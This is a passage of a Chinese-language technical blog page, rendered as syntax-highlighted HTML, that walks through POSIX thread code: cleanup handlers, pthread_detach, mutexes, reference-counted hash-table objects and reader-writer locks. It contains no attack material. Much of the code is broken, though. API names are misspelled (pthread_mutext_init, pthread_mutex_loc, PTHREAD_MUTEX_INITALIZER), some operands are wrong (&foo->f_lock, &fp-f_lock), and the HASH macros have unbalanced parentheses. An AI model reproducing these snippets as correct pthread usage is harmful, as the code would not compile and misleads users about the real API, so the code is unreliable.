start\n&quot;</span>);<br>pthread_cleanup_push(cleanup,<span class="hljs-string">&quot;thread 1 first handler&quot;</span>);<br>pthread_cleanup_push(cleanup,<span class="hljs-string">&quot;thread 1 second handler&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;thread 1 push complete\n&quot;</span>);<br><span class="hljs-keyword">if</span> (arg)<br><span class="hljs-keyword">return</span> ((<span class="hljs-type">void</span> *)<span class="hljs-number">1</span>);<br>pthread_cleanup_pop(<span class="hljs-number">0</span>);<br>pthread_cleanup_pop(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span>((<span class="hljs-type">void</span> *)<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> *<br><span class="hljs-title function_">thr_fn2</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;thread 2 start\n&quot;</span>);<br>pthread_cleanup_push(cleanup,<span class="hljs-string">&quot;thread 2 first handler&quot;</span>);<br>pthread_cleanup_push(cleanup,<span class="hljs-string">&quot;thread 2 second handler&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;thread 2 push complete\n&quot;</span>);<br><span class="hljs-keyword">if</span> (arg)<br>pthread_exit((<span class="hljs-type">void</span> *)<span class="hljs-number">2</span>);<br>pthread_cleanup_pop(<span class="hljs-number">0</span>);<br>pthread_cleanup_pop(<span class="hljs-number">0</span>);<br>pthread_exit((<span class="hljs-type">void</span> *)<span class="hljs-number">2</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">int</span> err;<br><span class="hljs-type">pthread_t</span> tid1, tid2;<br><span class="hljs-type">void</span> *tret;<br><br>err = pthread_create(&amp;tid1, <span class="hljs-literal">NULL</span>, thr_fn1,(<span class="hljs-type">void</span> *)<span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (err != <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;can&#x27;t create thread 1&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br>err = pthread_create(&amp;tid2, <span class="hljs-literal">NULL</span>, thr_fn2, (<span class="hljs-type">void</span> *)<span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (err != <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;can&#x27;t create thread 2&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br>err = pthread_join(tid1, &amp;tret);<br><span class="hljs-keyword">if</span> (err != <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;can&#x27;t join thread 1&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br>err = pthread_join(tid2,&amp;tret);<br><span class="hljs-keyword">if</span> (err != <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;can&#x27;t join thread 2&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="pthread-detach"><a href="#pthread-detach" class="headerlink" title="pthread_detach"></a>pthread_detach</h2><p>分离线程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_detach</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> tid)</span>;<br></code></pre></td></tr></table></figure><h1 id="线程互斥锁"><a href="#线程互斥锁" class="headerlink" title="线程互斥锁"></a>线程互斥锁</h1><h2 id="pthread-mutex-init和pthread-mutex-destroy"><a href="#pthread-mutex-init和pthread-mutex-destroy" class="headerlink" title="pthread_mutex_init和pthread_mutex_destroy"></a>pthread_mutex_init和pthread_mutex_destroy</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_mutext_init</span><span class="hljs-params">(<span class="hljs-type">pthread_mutex_t</span> *<span class="hljs-keyword">restrict</span> mutex,<span class="hljs-type">const</span> <span class="hljs-type">pthreaad_mutexattr_t</span> *retrict attr)</span>; <span class="hljs-comment">//初始化互斥变量</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_mutext_destroy</span><span class="hljs-params">(<span class="hljs-type">pthread_mutex_t</span> *mutex)</span>;<span class="hljs-comment">//销毁互斥变量</span><br>Both <span class="hljs-keyword">return</span>: <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OKk, error number on failure<br></code></pre></td></tr></table></figure><ul><li><code>mutex</code>：互斥变量</li><li><code>attr</code>：互斥属性</li></ul><h2 id="锁定互斥锁"><a href="#锁定互斥锁" class="headerlink" title="锁定互斥锁"></a>锁定互斥锁</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_mutex_loc</span><span class="hljs-params">(<span class="hljs-type">pthread_mutex_t</span> *mutex)</span>; <span class="hljs-comment">//锁定互斥锁</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_mutex_trylock</span><span class="hljs-params">(<span class="hljs-type">pthread_mutex_t</span> *mutex)</span>;<span class="hljs-comment">//有条件地锁定互斥锁</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_mutex_unlock</span><span class="hljs-params">(<span class="hljs-type">pthread_mutex_t</span> *mutex)</span>; <span class="hljs-comment">//解除互斥锁</span><br>All <span class="hljs-keyword">return</span>:<span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK, error number on failure<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">foo</span>&#123;</span><br>    <span class="hljs-type">int</span> f_count;<br>    <span class="hljs-type">pthread_mutex_t</span> f_lock;<br>    <span class="hljs-type">int</span> f_id;<br>&#125;;<br><br><span class="hljs-keyword">struct</span> foo *<br><span class="hljs-title function_">foo_alloc</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">foo</span> *<span class="hljs-title">fp</span>;</span><br>    <span class="hljs-keyword">if</span> ((fp = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> foo))) != <span class="hljs-literal">NULL</span>)&#123;<br>        fp-&gt;f_count = <span class="hljs-number">1</span>;<br>        fp-&gt;f_id = id;<br>        <span class="hljs-keyword">if</span> (pthread_mutex_init(&amp;foo-&gt;f_lock,<span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">free</span>(fp);<br>            <span class="hljs-keyword">return</span>(<span class="hljs-literal">NULL</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span>(fp);<br>&#125;<br><br><span class="hljs-type">void</span> <br><span class="hljs-title function_">foo_hold</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> foo *fp)</span><br>&#123;<br>    pthread_mutex_lock(&amp;fp-&gt;f_lock);<br>    fp-&gt;f_count++;<br>    pthread_mutex_unlock(&amp;fp-&gt;f_lock);<br>&#125;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">foo_rele</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> foo *fp)</span><br>&#123;<br>    pthread_mutex_lock(&amp;fp-&gt;f_lock);<br>    <span class="hljs-keyword">if</span> (--fp-&gt;f_count == <span class="hljs-number">0</span>)&#123;<br>        pthread_mutex_unlock(&amp;fp-&gt;f_lock);<br>        pthread_mutex_destroy(&amp;fp-&gt;f_lock);<br>        <span class="hljs-built_in">free</span>(fp);<br>        fp =  <span class="hljs-literal">NULL</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        pthread_mutex_unlock(&amp;fp-&gt;f_lock);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NHASH 29</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HASH(id) ((((unsigned long)id)%NHASH) <span class="hljs-comment">//生成HASH值</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">foo</span> *<span class="hljs-title">fh</span>[<span class="hljs-title">NHASH</span>];</span><br><br><span class="hljs-type">pthread_mutext_t</span> hashlock = PTHREAD_MUTEX_INITALIZER; <span class="hljs-comment">//初始化互斥锁</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">foo</span> &#123;</span><br>    <span class="hljs-type">int</span> f_count;<br>    <span class="hljs-type">pthread_mutext_t</span> f_lock;<br>    <span class="hljs-type">int</span> f_id;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">foo</span> *<span class="hljs-title">f_next</span>;</span><br>&#125;;<br><br><span class="hljs-keyword">struct</span> foo *<br><span class="hljs-title function_">foo_alloc</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">foo</span> *<span class="hljs-title">fp</span>;</span><br>    <span class="hljs-type">int</span> idx;<br><br>    <span class="hljs-keyword">if</span> ((fp = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> foo))) != <span class="hljs-literal">NULL</span>)&#123;<br>        fp-&gt;f_count = <span class="hljs-number">1</span>;<br>        fp-&gt;f_id = id;<br>        <span class="hljs-keyword">if</span> (pthread_mutext_init(&amp;fp-&gt;f_lock, <span class="hljs-literal">NULL</span>)  != <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">free</span>(fp);<br>            <span class="hljs-keyword">return</span>(<span class="hljs-literal">NULL</span>);<br>        &#125;<br>        idx = HASH(id);<br>        pthread_mutex_lock(&amp;hashlock);<br>        fp-&gt;f_next = fh[idx];<br>        fh[idx] = fp; <span class="hljs-comment">//头插入法</span><br>        pthread_mutext_lock(&amp;fp-&gt;f_lock);<br>        pthread_mutext_unlock(&amp;hashlock);<br>        pthread_mutext_unlock(&amp;fp-&gt;f_lock);<br>    &#125;<br>    <span class="hljs-keyword">return</span>(fp);<br>&#125;<br><br><span class="hljs-type">void</span> <br><span class="hljs-title function_">foo_hold</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> foo *fp)</span><br>&#123;<br>    pthread_mutex_lock(&amp;fp-&gt;f_lock);<br>    fp-&gt;f_count++;<br>    pthread_mutext_unlock(&amp;fp-&gt;f_lock);<br>&#125;<br><br><span class="hljs-keyword">struct</span> foo *<br><span class="hljs-title function_">foo_find</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">foo</span> *<span class="hljs-title">fp</span>;</span><br>    pthread_mutex_lock(&amp;hashlock);<br>    <span class="hljs-keyword">for</span> (fp = fh[HASH(id)]; fp != <span class="hljs-literal">NULL</span>; fp = fp-&gt;f_next)&#123;<br>            <span class="hljs-keyword">if</span> (fp-&gt;f_id == id)&#123;<br>                foo_hold(fp);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>    &#125;<br>    pthread_mutext_unlock(&amp;hashlock);<br>    <span class="hljs-keyword">return</span>(fp);<br>&#125;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">foo_rele</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> foo *fp)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">foo</span> *<span class="hljs-title">tfp</span>;</span><br>    <span class="hljs-type">int</span> idx;<br><br>    pthread_mutex_lock(&amp;fp-&gt;f_lock);<br>    <span class="hljs-keyword">if</span> (fp-&gt;f_count == <span class="hljs-number">1</span>)&#123;<br>        pthread_mutext_unlock(&amp;fp-&gt;f_lock);<br>        pthread_mutex_lock(&amp;hashlock);<br>        pthread_mutext_lock(&amp;fp-&gt;f_lock);<br>        <span class="hljs-keyword">if</span> (fp-&gt;f_count != <span class="hljs-number">1</span>)&#123;<br>            fp-&gt;f_count--;<br>            pthread_mutext_unlock(&amp;fp-&gt;f_lock);<br>            pthread_mutext_unlock(&amp;hashlock);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        idx = HASH(fp-&gt;f_id);<br>        tfp = fh[idx];<br>        <span class="hljs-keyword">if</span> (tfp == fp)&#123;<br>            fh[idx] = fp-&gt;f_next;<br>        &#125; <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">while</span> (tfp-&gt;f_next != fp)<br>                tfp = tfp-&gt;f_next;<br>            tfp-&gt;f_next = fp-&gt;f_next;<br>        &#125;<br>        pthread_mutext_unlock(&amp;hashlock);<br>        pthread_mutext_unlock(&amp;fp-&gt;f_lock);<br>        pthread_mutext_destroy(&amp;fp-&gt;f_lock);<br>        <span class="hljs-built_in">free</span>(fp);<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        fp-&gt;f_count--;<br>        pthread_mutext_unlock(&amp;fp-&gt;f_lock);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NHASH 29</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HASH(id) (((unsigned long)id) %NHASH))</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">foo</span> *<span class="hljs-title">fh</span>[<span class="hljs-title">NHASH</span>];</span><br><span class="hljs-type">pthread_mutext_t</span> hashlock = PTHREAD_MUTEX_INITALIZER;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">foo</span> &#123;</span><br>    <span class="hljs-type">int</span> f_count;<br>    <span class="hljs-type">pthread_mutext_t</span> f_lock;<br>    <span class="hljs-type">int</span> f_id;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">foo</span> *<span class="hljs-title">f_next</span>;</span><br>&#125;;<br><br><span class="hljs-keyword">struct</span> foo *<br><span class="hljs-title function_">foo_alloc</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">foo</span> *<span class="hljs-title">fp</span>;</span><br>    <span class="hljs-type">int</span> idx;<br><br>    <span class="hljs-keyword">if</span> ((fp = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> foo))) != <span class="hljs-literal">NULL</span>)&#123;<br>        fp-&gt;f_count = <span class="hljs-number">1</span>;<br>        fp-&gt;f_id = id;<br>        <span class="hljs-keyword">if</span> (pthread_mutext_init(&amp;fp-f_lock, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">free</span>(fp);<br>            <span class="hljs-keyword">return</span>(<span class="hljs-literal">NULL</span>);<br>        &#125;<br>        idx = HASH(id);<br>        pthread_mutex_lock(&amp;hashlock);<br>        fp-&gt;f_next = fh[idx];<br>        fh[idx] = fp;<br>        pthread_mutext_lock(&amp;fp-&gt;f_lock);<br>        pthread_mutext_unlock(&amp;hashlock);<br>        pthread_mutext_unlock(&amp;fp-&gt;f_lock);<br>    &#125;<br>    <span class="hljs-keyword">return</span>(fp);<br>&#125;<br><br><span class="hljs-type">void</span> <br><span class="hljs-title function_">foo_rele</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> foo *fp)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">foo</span> *<span class="hljs-title">tfp</span>;</span><br>    <span class="hljs-type">int</span> idx;<br><br>    pthread_mutex_lock(&amp;hashlock);<br>    <span class="hljs-keyword">if</span> (--fp-&gt;f_count == <span class="hljs-number">0</span>)&#123;<br>        idx = HASH(fp-&gt;f_id);<br>        tfp = fh[idx];<br>        <span class="hljs-keyword">if</span> (tfp == fp)&#123;<br>            fh[idx] = fp-&gt;f_next;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">while</span> (tfp-&gt;f_next != fp)<br>                tfp = tfp-&gt;f_next;<br>            tfp-&gt;f_next = fp-&gt;f_next;<br>        &#125;<br>        pthread_mutext_unlock(&amp;hashlock);<br>        pthread_mutext_destroy(&amp;fp-&gt;f_lock);<br>        <span class="hljs-built_in">free</span>(fp);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        pthread_mutext_unlock(&amp;hashlock);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="pthread-mutex-tiimedlock"><a href="#pthread-mutex-tiimedlock" class="headerlink" title="pthread_mutex_tiimedlock"></a>pthread_mutex_tiimedlock</h2><p>等待指定时间在加锁</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_mutex_timedlock</span><span class="hljs-params">(<span class="hljs-type">pthread_mutex_t</span> *<span class="hljs-keyword">restrict</span> mutex,<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> timespec *<span class="hljs-keyword">restrict</span> tsptr)</span>;<br>Returns:<span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK, error number on failure<br></code></pre></td></tr></table></figure><h2 id="读写器锁"><a href="#读写器锁" class="headerlink" title="读写器锁"></a>读写器锁</h2><p>初始化读写器锁</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_rwlock_init</span><span class="hljs-params">(<span class="hljs-type">pthread_rwlock_t</span> *<span class="hljs-keyword">restrict</span> rwlock,<span class="hljs-type">const</span> <span class="hljs-type">pthread_rwlockattr_t</span> *<span class="hljs-keyword">restrict</span> attr)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_rwlock_destroy</span><span class="hljs-params">(<span class="hljs-type">pthread_rwlock_t</span> *rwlock)</span>;<br>  Both <span class="hljs-keyword">return</span>: <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK, error number on failure<br><br></code></pre></td></tr></table></figure><p>锁读写器锁</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_rwlock_rdlock</span><span class="hljs-params">(<span class="hljs-type">pthread_rwlock_t</span> *rwlock)</span>; <span class="hljs-comment">//用于读</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_rwlock_wrlock</span><span class="hljs-params">(<span class="hljs-type">pthread_rwlock_t</span> *rwlock)</span>; <span class="hljs-comment">//用于写</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_rwlock_unlock</span><span class="hljs-params">(<span class="hljs-type">pthread_rwlock_t</span> *rwlock)</span>; <span class="hljs-comment">//解锁</span><br>All <span class="hljs-keyword">return</span>: <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK, error number on failure<br></code></pre></td></tr></table></figure><p>读写器锁定原语的条件版本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_rwlock_tryrdlock</span><span class="hljs-params">(<span class="hljs-type">pthread_rwlock_t</span> *rwlock)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_rwlock_trywrlock</span><span class="hljs-params">(<span class="hljs-type">pthread_rwlock_t</span> *rwlock)</span>;<br>Both <span class="hljs-keyword">return</span>: <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK, error number on failure<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span 